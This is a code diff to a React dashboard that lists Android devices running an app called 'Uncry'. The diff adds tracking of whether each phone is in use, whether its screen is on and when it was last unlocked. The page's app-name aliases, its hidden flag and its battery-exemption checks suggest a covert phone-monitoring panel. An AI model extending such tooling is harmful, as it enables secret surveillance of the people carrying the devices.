@@ -8,6 +8,7 @@ type Device = {
   installed:string[]; missing:string[]; monitorRunning:boolean;
   batteryOptimized:boolean; lastSeen:string; firstSeen:string; heartbeatCount:number;
   alias?:string; appLabel?:string; hidden?:boolean;
+  inUse?:boolean; screenOn?:boolean; lastUnlock?:string;
 };
 
 const ALIAS_OPTIONS = [
@@ -56,14 +57,15 @@ export default function Dashboard(){
 
     <div className="overflow-auto border rounded-2xl mt-6">
       <table className="w-full text-sm">
-        <thead className="bg-gray-50 text-gray-500"><tr><th className="text-left p-3">Device</th><th className="text-left p-3">Install state</th><th className="text-left p-3">Monitor</th><th className="text-left p-3">Battery</th><th className="text-left p-3">Last seen</th><th className="text-left p-3">Heartbeats</th><th className="text-left p-3">App name</th><th className="text-left p-3">Relay</th></tr></thead>
-        <tbody>{filtered.length===0?<tr><td colSpan={8} className="p-8 text-center text-gray-400">No devices yet — launch Uncry (poss) and it will register here.</td></tr>:filtered.map(d=>{
+        <thead className="bg-gray-50 text-gray-500"><tr><th className="text-left p-3">Device</th><th className="text-left p-3">Install state</th><th className="text-left p-3">Monitor</th><th className="text-left p-3">Battery</th><th className="text-left p-3">Usage</th><th className="text-left p-3">Last seen</th><th className="text-left p-3">Heartbeats</th><th className="text-left p-3">App name</th><th className="text-left p-3">Relay</th></tr></thead>
+        <tbody>{filtered.length===0?<tr><td colSpan={9} className="p-8 text-center text-gray-400">No devices yet — launch Uncry (poss) and it will register here.</td></tr>:filtered.map(d=>{
           const online=Date.now()-new Date(d.lastSeen).getTime()< 90_000;
           return <tr key={d.deviceId} className="border-t hover:bg-gray-50">
             <td className="p-3"><Link href={`/dashboard/${encodeURIComponent(d.deviceId)}`} className="font-mono text-xs text-violet-600 hover:underline">{d.deviceId.slice(0,12)}…</Link><div className="text-xs text-gray-500">{d.model} · A{d.androidVersion} · {d.appVersion}</div></td>
             <td className="p-3 text-xs">{d.installed.length?d.installed.join(", "):"none"} <span className="text-gray-400"> / missing: {d.missing.join(", ")||"—"}</span></td>
             <td className="p-3"><span className={`text-xs px-2 py-1 rounded-full ${d.monitorRunning?"bg-green-100 text-green-700":"bg-gray-100"}`}>{d.monitorRunning?"running":"stopped"}</span> <span className={`ml-1 text-xs px-2 py-1 rounded-full ${online?"bg-emerald-500 text-white":"bg-red-100 text-red-600"}`}>{online?"online":"offline"}</span></td>
             <td className="p-3 text-xs">{d.batteryOptimized?"optimized (risk)":"exempt ✓"}</td>
+            <td className="p-3"><span className={`text-xs px-2 py-1 rounded-full ${d.inUse?"bg-green-100 text-green-700":"bg-gray-100"}`}>{d.inUse?"in use":"idle"}</span><div className="text-[11px] text-gray-400 mt-1">{d.screenOn===false?"screen off":"screen on"}{d.lastUnlock?` · unlock ${new Date(d.lastUnlock).toLocaleTimeString()}`:""}</div></td>
             <td className="p-3 text-xs">{new Date(d.lastSeen).toLocaleString()}<div className="text-gray-400">first {new Date(d.firstSeen).toLocaleDateString()}</div></td>
             <td className="p-3 text-xs">{d.heartbeatCount} <Link href={`/dashboard/${encodeURIComponent(d.deviceId)}`} className="ml-2 text-violet-600 hover:underline">view →</Link></td>
             <td className="p-3"><div className="text-xs font-medium">{d.appLabel||"Uncry"}</div><div className="flex gap-1 mt-1">{ALIAS_OPTIONS.map(o=>(
